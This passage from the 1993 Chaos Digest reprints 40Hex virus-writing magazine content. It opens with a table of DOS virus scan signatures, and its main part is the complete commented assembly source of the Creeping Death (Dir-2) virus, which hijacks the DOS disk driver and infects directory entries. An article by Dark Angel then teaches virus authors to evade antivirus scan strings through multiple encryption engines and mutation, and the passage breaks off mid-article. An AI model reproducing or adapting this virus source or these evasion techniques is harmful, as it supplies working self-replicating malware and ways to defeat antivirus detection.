    0x90 0xea 0x59 0xec 0x00 0xf0 0x90 0x90

Jerusalem Virus Strain B [Jeru]:
    0x47 0x00 0x33 0xc0 0x8e 0xc0 0x26 0xa1
    0xfc 0x03

Alabama Virus [Alabama]:
    0x8f 0x06 0x18 0x05 0x26 0x8f 0x06 0x1a

1701/1704 Virus - Version B [170X]:
    0x31 0x34 0x31 0x24 0x46 0x4c

Datacrime Virus [Crime]:
    0x36 0x01 0x01 0x83 0xee 0x03 0x8b 0xc6
    0x3d 0x00

Stoned Virus [Stoned]:
    0x00 0x53 0x51 0x52 0x06 0x56 0x57 0xbe

Vacsina virus [Vacs]:
    0xb8 0x01 0x43 0x8e 0x5e 0x0e 0x8b 0x56
    0x06 0x2e

Den Zuk Virus :
    0x8e 0xc0 0xbe 0xc6 0x7c 0xbf 0x00 0x7e

Ping Pong Virus (old string):
    0x59 0x5b 0x58 0x07 0x1f 0xea

Pakistani Brain Virus [Brain]:
    0x8e 0xd8 0x8e 0xd0 0xbc 0x00 0xf0 0xfb
    0xa0 0x06

Yale/Alameda Virus [Alameda]:
    0xb4 0x00 0xcd 0x13 0x72 0x0d 0xb8 0x01

Lehigh Virus [Lehigh]:
    0x5e 0x83 0xee 0x03 0x8b 0xde 0x81 0xeb
    0x91 0x01

Pakistani Brain/Ashar Virus [Brain]:
    0x20 0x8c 0xc8 0x8e 0xd8 0x8e 0xd0

Fu Manchu Virus - Version A [Fu]:
    0x26 0xc7 0x06 0xfc 0x03 0xf3 0xa4 0x26
    0xc6 0x06

Ping Pong Virus - Version B [Ping]:
    0xa1 0xf5 0x81 0xa3 0xf5 0x7d 0x8b 0x36
    0xf9 0x81

1536 (Zero Bug) Virus [Zero]:
    0xeb 0x2b 0x90 0x5a 0x45 0xcd 0x60 0x2e

Vienna (DOS 62) Virus - Version B [Vienna]:
    0x8b 0xfe 0x36 0x6f 0xc7 0x1f 0x36 0x6f
    0x8b 0xde 0x36 0x6f 0xc6 0x1f

Ghost Version of DOS-62 [Ghost-C]:
    0x8e 0xd8 0xa1 0x13 0x04 0x2d 0x02 0x00
    0x90 0xa3 0x13

Friday 13th Virus [Fri13]:
    0xb4 0x4f 0xcd 0x21 0x73 0xf7 0x58

405 virus [405]:
    0x19 0xcd 0x21 0x26 0xa2 0x49 0x02 0xb4
    0x47 0x04 0x01 0x50

3066/2930 Traceback Virus [3066]:
    0x14 0x8b 0x4d 0x16 0x8b 0xc1 0x8a 0xcd

Pentagon Virus :
    0xeb 0x34 0x90 0x48 0x41 0x4c 0x20 0x20

Israeli Boot Virus:
    0xcd 0x13 0xb8 0x02 0x02 0xb9 0x06 0x27
    0xba 0x00 0x01

Typo Boot Virus:
    0x24 0x13 0x55 0xaa

Datacrime-2 Virus [Crime-2]:
    0x8a 0x94 0x03 0x01 0x8d 0xbc 0x29 0x01
    0x8d 0x8c 0xea 0x06

Ohio Virus:
    0xeb 0x29 0x90 0x49 0x34 0x12 0x00 0x01
    0x00 0x00 0x00 0x00

3551 (Syslock) Virus [Syslock]:
    0x33 0x06 0x14 0x00 0x31 0x04 0x46 0x46
    0xe2 0xf2

Dark Avenger virus [Dav]:
    0xa1 0x4f 0x07 0x89 0x07 0x2e 0xa1 0x51

MIX1/Icelandic Virus [Ice]:
    0x43 0x81 0x3f 0x45 0x58 0x75 0xf1 0xb8
    0x00 0x43

Disk Killer Virus [Killer]:
    0xc3 0x10 0xe2 0xf2 0xc6 0x06 0xf3 0x01
    0xff 0x90 0xeb 0x55

AIDS Virus [Taunt]:
    0x42 0xe8 0xef 0xe3 0xbf 0xca 0x03 0x1e

Yankee Doodle Virus [Doodle]:
    0x35 0xcd 0x21 0x8b 0xf3 0x8c 0xc7

Suriv A Virus [SurivA]:
    0x90 0x73 0x55 0x52 0x49 0x56 0x00

Suriv B Virus [SurivB]:
    0x00 0x73 0x55 0x52 0x49 0x56 0x00

]============================================================================[

------------------------------

End of Chaos Digest #1.50
************************************

Chaos Digest              Mercredi 9 Juin 1993        Volume 1 : Numero 51
                            ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.51 (9 Juin 1993)
File 1--40H VMag Number 6 Volume 2 Issue 2 #00A (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Number 6 Volume 2 Issue 2 #00A (reprint)


40Hex Number 6 Volume 2 Issue 2                                      File 00A

     Welcome to this issue's VIRUS SPOTLITE, the infamous Creeping
Death(dir2).
This is one of the most impressive viruses out there, and VirusSoft looks to
be
a promising group in the future.  Unfortunately, the source code we obtained
had almost no comments.  Dark Angel commented it as best as he possibly could,
but I think it is safe to say that there may be a few discrepancies.
Nonetheless, it was an excellent job, kudos to DA.  Although I am writing this
header, I had nothing to do with the commenting, so Dark Angel gets all the
credit.

                                                -)GHeap

------------------------------------------------------------------------------
-
; Dark Angel's comments: I spent my entire waking hours looking at this virus.
;                        I love it.  It is my life.  I worship the drive it
;                        infects.  Take a look at it.  Let not my troubles be
;                        in vain.  Why did I do this?  I sacrifice my life for
;                        the benefit of 40Hex.  If you don't read this, I'm
;                        gonna go join [NuKE].

;        Creeping Death  V 1.0
;
;        (C) Copyright 1991 by VirusSoft Corp.

i13org    =    5f8h
i21org    =    5fch

dir_2   segment byte public
        assume  cs:dir_2, ds:dir_2

        org   100h

start:
         mov   sp,600h                        ;Set up the stack pointer
         inc   word ptr counter               ;Generation counter
         xor   cx,cx
         mov   ds,cx                          ;DS points to interrupt table
         lds   ax, ds:[0c1h]                  ;Find interrupt 30h
         add   ax,21h                         ;Change it to Int 21h
         push  ds                             ;Save it on stack for use by
         push  ax                             ;subroutine "jump"
         mov   ah,30h                         ;Get DOS version
         call  jump
         cmp   al,4                           ;DOS 4.X+ : SI = 0
         sbb   si,si                          ;DOS 2/3  : SI = -1
         mov   byte ptr [drive+2],byte ptr -1 ;Initialise last drive to
                                              ;"never accessed"
         mov   bx,60h                         ;Adjust memory in ES to
         mov   ah,4ah                         ;BX paragraphs.
         call  jump

         mov   ah,52h                         ;Get DOS List of Lists
         call  jump                           ;to ES:BX
         push  es:[bx-2]                      ;Save Segment of first MCB
         lds   bx,es:[bx]                     ;DS:BX -> 1st DPB
                                              ; (Drive parameter block)
search:  mov   ax,[bx+si+15h]                 ;Get segment of device driver
         cmp   ax,70h                         ;Is it CONFIG? (I think)
         jne   next                           ;If not, try again
         xchg  ax,cx                          ;Move driver segment to CX
         mov   [bx+si+18h],byte ptr -1        ;Flag block must be rebuilt
         mov   di,[bx+si+13h]                 ;Save offset of device driver
                                              ;Original device driver
                                              ;address in CX:DI
         mov   [bx+si+13h],offset header      ;Replace with our own
         mov   [bx+si+15h],cs                 ; (header)
next:    lds   bx,[bx+si+19h]                 ;Get next device block
         cmp   bx,-1                          ;Is it the last one?
         jne   search                         ;If not, search it
         jcxz  install

         pop   ds                             ;Restore segment of first
         mov   ax,ds                          ;MCB
         add   ax,ds:[3]                      ;Go to next MCB
         inc   ax                             ;AX = segment next MCB
         mov   dx,cs                          ;DX = MCB owning current
         dec   dx                             ;     program
         cmp   ax,dx                          ;Are these the same?
         jne   no_boot                        ;If not, we are not currently
                                              ;in the middle of a reboot
         add   word ptr ds:[3],61h            ;Increase length owned by
                                              ;MCB by 1552 bytes
no_boot: mov   ds,dx                          ;DS = MCB owning current
                                              ;program
         mov   word ptr ds:[1],8              ;Set owner = DOS

         mov   ds,cx                          ;DS = segment of original
                                              ;     device driver
         les   ax,[di+6]                      ;ES = offset int handler
                                              ;AX = offset strategy entry
         mov   word ptr cs:str_block,ax       ;Save entry point
         mov   word ptr cs:int_block,es       ;And int block for use in
                                              ;function _in
         cld                                  ;Scan for the write
         mov   si,1                           ;function in the
scan:    dec   si                             ;original device driver
         lodsw
         cmp   ax,1effh
         jne   scan
         mov   ax,2cah                        ;Wicked un-yar place o'
         cmp   [si+4],ax                      ;doom.
         je    right
         cmp   [si+5],ax
         jne   scan
right:   lodsw
         push  cs
         pop   es
         mov   di,offset modify+1             ;Save address of patch
         stosw                                ;area so it can be changed
         xchg  ax,si                          ;later.
         mov   di,offset i13org               ;This is in the stack, but
         cli                                  ;it is used by "i13pr"
         movsw
         movsw

         mov   dx,0c000h                      ;Scan for hard disk ROM
                                              ;Start search @ segment C000h
fdsk1:   mov   ds,dx                          ;Load up the segment
         xor   si,si                          ;atart at offset 0000h
         lodsw                                ;Scan for the signature
         cmp   ax,0aa55h                      ;Is it the signature?
         jne   fdsk4                          ;If not, change segment
         cbw                                  ;clear AH
         lodsb                                ;load a byte to AL
         mov   cl,9
         sal   ax,cl                          ;Shift left, 0 filled
fdsk2:   cmp   [si],6c7h
         jne   fdsk3
         cmp   word ptr [si+2],4ch
         jne   fdsk3
         push  dx                             ;Save the segment
         push  [si+4]                         ;and offset on stack
         jmp   short death                    ;for use by i13pr

install: int   20h
file:    db    "c:",255,0
fdsk3:   inc   si                             ;Increment search offset
         cmp   si,ax                          ;If we are not too high,
         jb    fdsk2                          ;try again
fdsk4:   inc   dx                             ;Increment search segment
         cmp   dh,0f0h                        ;If we are not in high
         jb    fdsk1                          ;memory, try again

         sub   sp,4                           ;effectively push dummy vars.
death:   push  cs                             ;on stack for use by i13pr
         pop   ds
         mov   bx,ds:[2ch]                    ;Get environment from PSP
         mov   es,bx
         mov   ah,49h                         ;Release it (to save memory)
         call  jump
         xor   ax,ax
         test  bx,bx                          ;Is BX = 0?
         jz    boot                           ;If so, we are booting now
         mov   di,1                           ;and not running a file
seek:    dec   di                             ;Search for end of
         scasw                                ;the environment block
         jne   seek
         lea   si,[di+2]                      ;SI points to filename
         jmp   short exec                     ;(in DOS 3.X+)
                                              ;Execute that file
boot:    mov   es,ds:[16h]                    ;get PSP of parent
         mov   bx,es:[16h]                    ;get PSP of parent
         dec   bx                             ;go to its MCB
         xor   si,si
exec:    push  bx
         mov   bx,offset param                ;Set up parameter block
                                              ;for EXEC function
         mov   [bx+4],cs                      ;segment to command line
         mov   [bx+8],cs                      ;segment to 1st FCB
         mov   [bx+12],cs                     ;segment to 2nd FCB
         pop   ds
         push  cs
         pop   es

         mov   di,offset f_name
         push  di                             ;Save filename offset
         mov   cx,40                          ;Copy the filename to
         rep   movsw                          ;the buffer
         push  cs
         pop   ds

         mov   ah,3dh                         ;Handle open file
         mov   dx,offset file                 ;"c:",0
         call  jump
         pop   dx                             ;DS:DX -> filename

         mov   ax,4b00h                       ;Load and Execute
         call  jump                           ;ES:BX = param block
         mov   ah,4dh                         ;Get errorlevel
         call  jump
         mov   ah,4ch                         ;Terminate

jump:    pushf                                ;Simulate an interrupt 21h
         call  dword ptr cs:[i21org]
         ret


;--------Installation complete

i13pr:   mov   ah,3                           ;Write AL sectors from ES:BX
         jmp   dword ptr cs:[i13org]          ;to track CH, sector CL,
                                              ;head DH, drive DL


main:    push  ax            ; driver
         push  cx            ; strategy block
         push  dx
         push  ds
         push  si
         push  di

         push  es                             ;Move segment of parameter
         pop   ds                             ;block to DS
         mov   al,[bx+2]                      ;[bx+2] holds command code

         cmp   al,4                           ;Input (read)
         je    input
         cmp   al,8                           ;Output (write)
         je    output
         cmp   al,9                           ;Output (write) with verify
         je    output

         call  in_                            ;Call original device
         cmp   al,2                           ;Request build BPB
         jne   ppp                            ;If none of the above, exit
         lds   si,[bx+12h]                    ;DS:SI point to BPB table
         mov   di,offset bpb_buf              ;Replace old pointer with
         mov   es:[bx+12h],di                 ;a pointer to our own
         mov   es:[bx+14h],cs                 ;BPB table
         push  es                             ;Save segment of parameters
         push  cs
         pop   es
         mov   cx,16                          ;Copy the old BPB table to
         rep   movsw                          ;our own
         pop   es                             ;Restore parameter segment
         push  cs
         pop   ds
         mov   al,[di+2-32]                   ;AL = sectors per allocation
         cmp   al,2                           ;     unit.  If less than
         adc   al,0                           ;     2, increment
         cbw                                  ;Extend sign to AH (clear AH)
         cmp   word ptr [di+8-32],0           ;Is total number sectors = 0?
         je    m32                            ;If so, big partition (>32MB)
         sub   [di+8-32],ax                   ;Decrease space of disk by
                                              ;one allocation unit(cluster)
         jmp   short ppp                      ;Exit
m32:     sub   [di+15h-32],ax                 ;Handle large partitions
         sbb   word ptr [di+17h-32],0

ppp:     pop   di
         pop   si
         pop   ds
         pop   dx
         pop   cx
         pop   ax
rts:     retf                                 ;We are outta here!

output:  mov   cx,0ff09h
         call  check                          ;is it a new disk?
         jz    inf_sec                        ;If not, go away
         call  in_                            ;Call original device handler
         jmp   short inf_dsk

inf_sec: jmp   _inf_sec
read:    jmp   _read
read_:   add   sp,16                          ;Restore the stack
         jmp   short ppp                      ;Leave device driver

input:   call  check                          ;Is it a new disk?
         jz    read                           ;If not, leave
inf_dsk: mov   byte ptr [bx+2],4              ;Set command code to READ
         cld
         lea   si,[bx+0eh]                    ;Load from buffer address
         mov   cx,8                           ;Save device driver request
save:    lodsw                                ;on the stack
         push  ax
         loop  save
         mov   word ptr [bx+14h],1            ;Starting sector number = 1
                                              ;(Read 1st FAT)
         call  driver                         ;Read one sector
         jnz   read_                          ;If error, exit
         mov   byte ptr [bx+2],2              ;Otherwise build BPB
         call  in_                            ;Have original driver do the
                                              ;work
         lds   si,[bx+12h]                    ;DS:SI points to BPB table
         mov   ax,[si+6]                      ;Number root directory entries
         add   ax,15                          ;Round up
         mov   cl,4
         shr   ax,cl                          ;Divide by 16 to find sectors
                                              ;of root directory
         mov   di,[si+0bh]                    ;DI = sectors/FAT
         add   di,di                          ;Double for 2 FATs
         stc                                  ;Add one for boot record
         adc   di,ax                          ;Add sector size of root dir
         push  di                             ;to find starting sector of
                                              ;data (and read)
         cwd                                  ;Clear DX
         mov   ax,[si+8]                      ;AX = total sectors
         test  ax,ax                          ;If it is zero, then we have
         jnz   more                           ;an extended partition(>32MB)
         mov   ax,[si+15h]                    ;Load DX:AX with total number
         mov   dx,[si+17h]                    ;of sectors
more:    xor   cx,cx
         sub   ax,di                          ;Calculate FAT entry for last
                                              ;sector of disk
         sbb   dx,cx
         mov   cl,[si+2]                      ;CL = sectors/cluster
         div   cx                             ;AX = cluster #
         cmp   cl,2                           ;If there is more than 1
         sbb   ax,-1                          ;cluster/sector, add one
         push  ax                             ;Save cluster number
         call  convert                        ;AX = sector number to read
                                              ;DX = offset in sector AX
                                              ;     of FAT entry
                                              ;DI = mask for EOF marker
         mov   byte ptr es:[bx+2],4           ;INPUT (read)
         mov   es:[bx+14h],ax                 ;Starting sector = AX
         call  driver                         ;One sector only
again:   lds   si,es:[bx+0eh]                 ;DS:SI = buffer address
         add   si,dx                          ;Go to FAT entry
         sub   dh,cl                          ;Calculate a new encryption
         adc   dx,ax                          ;value
         mov   word ptr cs:gad+1,dx           ;Change the encryption value
         cmp   cl,1                           ;If there is 0 cluster/sector
         je    small_                         ;then jump to "small_"
         mov   ax,[si]                        ;Load AX with offset of FAT
                                              ;entry
         and   ax,di                          ;Mask it with value from
                                              ;"convert" then test to see
                                              ;if the sector is fine
         cmp   ax,0fff7h                      ;16 bit reserved/bad
         je    bad
         cmp   ax,0ff7h                       ;12 bit reserved/bad
         je    bad
         cmp   ax,0ff70h                      ;12 bit reserved/bad
         jne   ok
bad:     pop   ax                             ;Tried to replicate on a bad
         dec   ax                             ;cluster.  Try again on a
         push  ax                             ;lower one.
         call  convert                        ;Find where it is in the FAT
         jmp   short again                    ;and try once more
small_:  not   di                             ;Reverse mask bits
         and   [si],di                        ;Clear other bits
         pop   ax                             ;AX = cluster number
         push  ax
         inc   ax                             ;Need to do 2 consecutive
         push  ax                             ;bytes
         mov   dx,0fh
         test  di,dx
         jz    here
         inc   dx                             ;Multiply by 16
         mul   dx
here:    or    [si],ax                        ;Set cluster to next
         pop   ax                             ;Restore cluster of write
         call  convert                        ;Calculate buffer offset
         mov   si,es:[bx+0eh]                 ;Go to FAT entry (in buffer)
         add   si,dx
         mov   ax,[si]
         and   ax,di
ok:      mov   dx,di                          ;DI = mask from "convert"
         dec   dx
         and   dx,di                          ;Yerg!
         not   di
         and   [si],di
         or    [si],dx                        ;Set [si] to DI

         cmp   ax,dx                          ;Did we change the FAT?
         pop   ax                             ;i.e. Are we already on this
         pop   di                             ;disk?
         mov   word ptr cs:pointer+1,ax       ;Our own starting cluster
         je    _read_                         ;If we didn't infect, then
                                              ;leave the routine.  Oh
                                              ;welp-o.
         mov   dx,[si]
         push  ds
         push  si
         call  write                          ;Update the FAT
         pop   si
         pop   ds
         jnz   _read_                         ;Quit if there's an error
         call  driver
         cmp   [si],dx
         jne   _read_
         dec   ax
         dec   ax
         mul   cx                             ;Multiply by sectors/cluster
                                              ;to find the sector of the
                                              ;write
         add   ax,di
         adc   dx,0
         push  es
         pop   ds
         mov   word ptr [bx+12h],2            ;Byte/sector count
         mov   [bx+14h],ax                    ;Starting sector #
         test  dx,dx
         jz    less
         mov   word ptr [bx+14h],-1           ;Flag extended partition
         mov   [bx+1ah],ax                    ;Handle the sector of the
         mov   [bx+1ch],dx                    ;extended partition
less:    mov   [bx+10h],cs                    ;Transfer address segment
         mov   [bx+0eh],100h                  ;and the offset (duh)
         call  write                          ;Zopy ourselves!
                                              ;(We want to travel)
_read_:  std
         lea   di,[bx+1ch]                    ;Restore device driver header
         mov   cx,8                           ;from the stack
load:    pop   ax
         stosw
         loop  load
_read:   call  in_                            ;Call original device handler

         mov   cx,9
_inf_sec:
         mov   di,es:[bx+12h]                 ;Bytes/Sector
         lds   si,es:[bx+0eh]                 ;DS:SI = pointer to buffer
         sal   di,cl                          ;Multiply by 512
                                              ;DI = byte count
         xor   cl,cl
         add   di,si                          ;Go to address in the buffer
         xor   dl,dl                          ;Flag for an infection in
                                              ;function find
         push  ds
         push  si
         call  find                           ;Infect the directory
         jcxz  no_inf
         call  write                          ;Write it back to the disk
         and   es:[bx+4],byte ptr 07fh        ;Clear error bit in status
                                              ;word
no_inf:  pop   si
         pop   ds
         inc   dx                             ;Flag for a decryption in
                                              ;function find
         call  find                           ;Return right information to
                                              ;calling program
         jmp   ppp

;--------Subroutines

find:    mov   ax,[si+8]                      ;Check filename extension
         cmp   ax,"XE"                        ;in directory structure
         jne   com
         cmp   [si+10],al
         je    found
com:     cmp   ax,"OC"
         jne   go_on
         cmp   byte ptr [si+10],"M"
         jne   go_on
found:   test  [si+1eh],0ffc0h ; >4MB         ;Check file size high word
         jnz   go_on                          ;to see if it is too big
         test  [si+1dh],03ff8h ; <2048B       ;Check file size low word
         jz    go_on                          ;to see if it is too small
         test  [si+0bh],byte ptr 1ch          ;Check attribute for subdir,
         jnz   go_on                          ;volume label or system file
         test  dl,dl                          ;If none of these, check DX
         jnz   rest                           ;If not 0, decrypt
pointer: mov   ax,1234h                       ;mov ax, XX modified elsewhere
         cmp   ax,[si+1ah]                    ;Check for same starting
                                              ;cluster number as us
         je    go_on                          ;If it is, then try another
         xchg  ax,[si+1ah]                    ;Otherwise make it point to
                                              ;us.
gad:     xor   ax,1234h                       ;Encrypt their starting
                                              ;cluster
         mov   [si+14h],ax                    ;And put it in area reserved
                                              ;by DOS for no purpose
         loop  go_on                          ;Try another file
rest:    xor   ax,ax                          ;Disinfect the file
         xchg  ax,[si+14h]                    ;Get starting cluster
         xor   ax,word ptr cs:gad+1           ;Decrypt the starting cluster
         mov   [si+1ah],ax                    ;and put it back
go_on:   db    2eh,0d1h,6                     ;rol cs:[gad+1], 1
         dw    offset gad+1                   ;Change encryption and
         add   si,32                          ;go to next file
         cmp   di,si                          ;If it is not past the end of
         jne   find                           ;the buffer, then try again
         ret                                  ;Otherwise quit

check:   mov   ah,[bx+1]                      ;ah = unit code (block device
                                              ;                only)
drive:   cmp   ah,-1                          ;cmp ah, XX can change.
                                              ;Compare with the last call
                                              ;-1 is just a dummy
                                              ;impossible value that will
                                              ;force the change to be true
         mov   byte ptr cs:[drive+2],ah       ;Save this call's drive
         jne   changed                        ;If not the same as last call
                                              ;media has changed
         push  [bx+0eh]                       ;If it is the same physical
                                              ;drive, see if floppy has
                                              ;been changed
         mov   byte ptr [bx+2],1              ;Tell original driver to do a
         call  in_                            ;media check (block only)
         cmp   byte ptr [bx+0eh],1            ;Returns 1 in [bx+0eh] if
         pop   [bx+0eh]                       ;media has not been changed
         mov   [bx+2],al                      ;Restore command code
changed: ret                                  ;CF,ZF set if media has not
                                              ;been changed, not set if
                                              ;has been changed or we don't
                                              ;know
write:   cmp   byte ptr es:[bx+2],8           ;If we want OUTPUT, go to
         jae   in_                            ;original device handler
                                              ;and return to caller
         mov   byte ptr es:[bx+2],4           ;Otherwise, request INPUT
         mov   si,70h
         mov   ds,si                          ;DS = our segment
modify:  mov   si,1234h                       ;Address is changed elsewhere
         push  [si]
         push  [si+2]
         mov   [si],offset i13pr
         mov   [si+2],cs
         call  in_                            ;Call original device handler
         pop   [si+2]
         pop   [si]
         ret

driver:  mov   word ptr es:[bx+12h],1         ;One sector
in_:                                          ;in_ first calls the strategy
                                              ;of the original device
                                              ;driver and then calls the
                                              ;interrupt handler
         db    09ah                           ;CALL FAR PTR
str_block:
         dw    ?,70h                          ;address
         db    09ah                           ;CALL FAR PTR
int_block:
         dw    ?,70h                          ;address
         test  es:[bx+4],byte ptr 80h         ;Was there an error?
         ret

convert: cmp   ax,0ff0h                       ;0FFF0h if 12 bit FAT
         jae   fat_16                         ;0FF0h = reserved cluster
         mov   si,3                           ;12 bit FAT
         xor   word ptr cs:[si+gad-1],si      ;Change the encryption value
         mul   si                             ;Multiply by 3 and
         shr   ax,1                           ;divide by 2
         mov   di,0fffh                       ;Mark it EOF (low 12 bits)
         jnc   cont                           ;if it is even, continue
         mov   di,0fff0h                      ;otherwise, mark it EOF (high
         jmp   short cont                     ;12 bits) and then continue
fat_16:  mov   si,2                           ;16 bit FAT
         mul   si                             ;Double cluster #
         mov   di,0ffffh                      ;Mark it as end of file
cont:    mov   si,512
         div   si                             ;AX = sector number
                                              ;(relative to start of FAT)
                                              ;DX = offset in sector AX
header:  inc   ax                             ;Increment AX to account for
         ret                                  ;boot record

counter: dw    0

         dw    842h                           ;Attribute
                                              ; Block device
                                              ; DOS 3 OPEN/CLOSE removable
                                              ;       media calls supported
                                              ; Generic IOCTL call supported
                                              ;Supports 32 bit sectors
         dw    offset main                    ;Strategy routine
         dw    offset rts                     ;Interrupt routine (rtf)
         db    7fh                            ;Number of subunits supported
                                              ;by this driver.  Wow, lookit
                                              ;it -- it's so large and juicy

; Parameter block format:
; 0  WORD Segment of environment
; 2 DWORD pointer to command line
; 6 DWORD pointer to 1st default FCB
;10 DWORD pointer to 2nd default FCB
param:   dw    0,80h,?,5ch,?,6ch,?

bpb_buf: db    32 dup(?)
f_name:  db    80 dup(?)

;--------The End.
dir_2   ends
        end     start

MsDos

------------------------------

End of Chaos Digest #1.51
************************************

Chaos Digest             Vendredi 11 Juin 1993        Volume 1 : Numero 52
                            ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.52 (11 Juin 1993)
File 1--40H VMag Number 6 Volume 2 Issue 2 #00B-00C (reprint)
File 2--Fortress: services de securite europeens a la loupe (rapport)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Number 6 Volume 2 Issue 2 #00B-00C (reprint)


40Hex Number 6 Volume 2 Issue 2                                    File 00B

                      ++++++++++++++++++++++++++++++
                       SCAN STRINGS, HOW THEY WORK,
                           AND HOW TO AVOID THEM
                      ++++++++++++++++++++++++++++++
                               By Dark Angel
                      ++++++++++++++++++++++++++++++

Scan strings  are the  scourge of  the virus author and the friend of anti-
virus wanna-bes.   The  virus author  must find encryption techniques which
can successfully  evade easy detection.  This article will show you several
such techniques.

Scan strings,  as you  are well  aware, are  a collection of bytes which an
anti-viral product  uses to  identify a virus.  The important thing to keep
in mind  is that  these scan  strings represent  actual code  and can NEVER
contain code  which could occur in a "normal" program.  The trick is to use
this to your advantage.

When a  scanner checks  a file for a virus, it searches for the scan string
which could  be located  ANYWHERE IN  THE FILE.   The  scanner doesn't care
where it  is.   Thus, a  file which  consists solely of the scan string and
nothing else  would be  detected as  infected by  a virus.   A  scanner  is
basically  an   overblown  "hex  searcher"  looking  for  1000  signatures.
Interesting, but  there's not  much you  can do  to exploit this.  The only
thing you  can do  is to  write code so generic that it could be located in
any program  (by chance).   Try  creating a  file with  the following debug
script and  scanning it.   This  demonstrates the fact that the scan string
may be located at any position in the file.

---------------------------------------------------------------------------

n marauder.com
e 0100  E8 00 00 5E 81 EE 0E 01 E8 05 00 E9

rcx
000C
w
q

---------------------------------------------------------------------------

Although scanners  normally search  for decryption/encryption  routines, in
Marauder's case,  SCAN looks  for the  "setup" portion  of the  code,  i.e.
setting up  BP (to the "delta offset"), calling the decryption routine, and
finally jumping to program code.

What you  CAN do  is to  either minimise  the scannable code or to have the
code constantly  mutate into  something different.  The reasons are readily
apparent.

The simplest  technique is  having multiple  encryption engines.   A  virus
utilising this  technique has  a database  of encryption/decryption engines
and uses  a random  one each  time it infects.  For example, there could be
various forms  of XOR  encryption or  perhaps another  form of mathematical
encryption.   The trick  is to  simply replace  the code for the encryption
routine each time with the new encryption routine.

Mark Washburn  used this  in his  V2PX series of virii.  In it, he used six
different  encryption/decryption   algorithms,  and   some  mutations   are
impossible to detect with a mere scan string.  More on those later.

Recently, there  has been  talk of  the so-called  MTE, or mutating engine,
from Bulgaria  (where else?).   It  utilises the multiple encryption engine
technique.   Pogue Mahone  used the  MTE and it took McAfee several days to
find a  scan string.   Vesselin  Bontchev, the McAfee-wanna-be of Bulgaria,
marvelled the engineering of this engine.  It is distributed as an OBJ file
designed to  be able to be linked into any virus.  Supposedly, SCANV89 will
be able to detect any virus using the encryption engine, so it is worthless
except for  those who  have an  academic interest  in such matters (such as
virus authors).

However,  there   is  a  serious  limitation  to  the  multiple  encryption
technique, namely  that scan  strings may  still be  found.   However, scan
strings must  be isolated  for each  different encryption  mechanism.    An
additional  benefit   is  the   possibility  that  the  antivirus  software
developers will  miss some  of the  encryption mechanisms  so not  all  the
